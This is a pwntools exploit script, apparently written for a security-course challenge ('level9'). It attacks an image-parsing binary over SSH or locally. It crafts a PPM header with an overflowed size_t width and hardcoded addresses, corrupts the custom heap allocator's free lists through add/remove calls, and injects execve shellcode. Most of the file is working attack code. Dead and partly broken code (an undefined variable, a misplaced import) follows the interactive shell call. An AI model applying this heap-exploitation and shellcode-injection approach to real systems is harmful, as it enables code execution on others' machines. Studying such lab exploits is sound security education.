#!/usr/bin/env python3

from asyncio import log
from pwn import *
import ctypes



exe = ELF("/var/challenge/level9/9")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-v']

shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
shellcode_prev ="""
    mov rcx, 0x7fffffffe91effff
    shr rcx, 16
    jmp rcx
"""
print(shellcode)
shellcode = asm(shellcode)
shellcode_prev = asm(shellcode_prev)

vlas = """             x/10gx $rax
            x/20gx &entries     
            x/100gx ((long *)(&entries))[1]
            b *add_image+0x02bb
            b *parse_image+426
            b *my_free
            b *my_malloc
            c """
def conn():
    if args.SSH and not args.DEB:
        shell = ssh(host='appsec.vusec.net', user='rockygo2', port=41234, keyfile='~/.ssh/id_ed25519')
        r = shell.process(['/home/rockygo2/challenge/level9/9'])
    if args.SSH and args.DEB:
        shell = ssh(host='appsec.vusec.net', user='rockygo2', port=41234, keyfile='~/.ssh/id_ed25519')
        # Start a process on the server
        r = gdb.debug(['/home/rockygo2/challenge/level9/9'], exe='/home/rockygo2/challenge/level9/9',             
                                    ssh=shell,
                                    gdbscript='''
        c
        ''')
        
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="""
	    b *parse_image+426
            b *free_list_remove
            c
        """)


    return r

def add_image(r, name, base64_data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", name)
    r.sendafter(b": ", base64_data)
    r.sendline(b"\n")

def remove_image(r, index):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", index)

def show_images(r):
    r.sendlineafter(b"> ", b"3")

def display_image(r, index):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", index)

def Exit(r):
    r.sendlineafter(b"> ", b"5")


struct_pixel_size = 0x18

struct_malloc = """ struct entry {
	size_t size;
	struct entry *free_prev;
	struct entry *free_next;
	struct entry *block_prev;
};
 """
def write_ppm(filename):
    string_made = b""
    # largest negative number for signed equivalent
    a = ctypes.c_size_t(-1).value
    b = 1
    width, height = a, b
    string_made += b"P6\n" + f"{width} {height}\n".encode() + b"255\n"
    string_made +=b"\x4a"*1+ b"\x00"*7
    string_made += p64(0x7fffffffe478)
    return string_made

def main():
    r = conn()
    # Plan get free_first to have a boolean value of 1
    # ctypes.c_size_t represents C's size_t
    # Overwriting 0x0000000000000418	0x0000000000000000
        #0x730af12d9080:	0x0000730af12d97b8	0x0000730af12d9050
	        #0x730af12d9090:	0x4b55544e796f514d	0x7171717171717171
    # libc_offset = 0x000074fae68cc400 - 0x000074fae6600000
    image_file_name = "/home/rockygo2/challenge/level9/image.ppm"
    image_data = write_ppm(image_file_name)
    #image_data = open(image_file_name, "rb").read()
    image_data_b64 = base64.standard_b64encode(image_data)
    print(hex(len(image_data_b64))) # the size of the malloc + 4
    image_data_infinite = b"UDYKMTg0NDY3NDQwNzM3MDk1NTE2MTUgMQoyNTUK" + b"q"*1000
    overwrite = b"UDYKMSAxCjI1NQq7u7u7u7u7u7u7u7s3222212="
    #add_image(r, image_name, base64.standard_b64encode(image_data))
    shellcodeT = b"\xbb"*40 + shellcode_prev + b"\xff"*50 + shellcode + b"\xbb"*40
    print(shellcodeT)
    add_image(r, shellcodeT, image_data_b64)
    #remove_image(r, b"0")
    #add_image(r, name, overwrite)
    add_image(r, "A", overwrite)
    remove_image(r, b"0")
    add_image(r, b"A"*0x158+ shellcode + b"\xaa"*656, overwrite)
    Exit(r)
    r.interactive()

    show_images(r)
    r.readuntil(b"X")
    leaked = r.recv(8).strip(b"\nDi").ljust(8, b"\x00")
    leaked_base = u64(leaked) << 8
    heap_offset = 0x7149f4b3e400 - 0x00007149f4b3e000
    heap_address = leaked_base - heap_offset

    log.success(f"LEAKED Heap address: {hex(leaked_base)}")
    log.success(f"Heap BASE: {hex(heap_address)}")
    
    add_image(r, name, image_data_infinite)
    add_image(r, name, base64.standard_b64encode(image_data))
    add_image(r, name, base64.standard_b64encode(image_data))
    add_image(r, name, base64.standard_b64encode(image_data))
    add_image(r, name, base64.standard_b64encode(image_data))
    add_image(r, name, base64.standard_b64encode(image_data))
    #add_image(r, b"B"*32, base64.standard_b64encode(image_data) )
    #add_image(r, b"C"*32, base64.standard_b64encode(image_data))
    remove_image(r, b"1")
    remove_image(r, b"3")
    #add_image(r, image_name, base64.standard_b64encode(image_data))
    #add_image(r, image_name, base64.standard_b64encode(image_data))
    show_images(r)
    display_image(r, b"0")


if __name__ == "__main__":
    main()
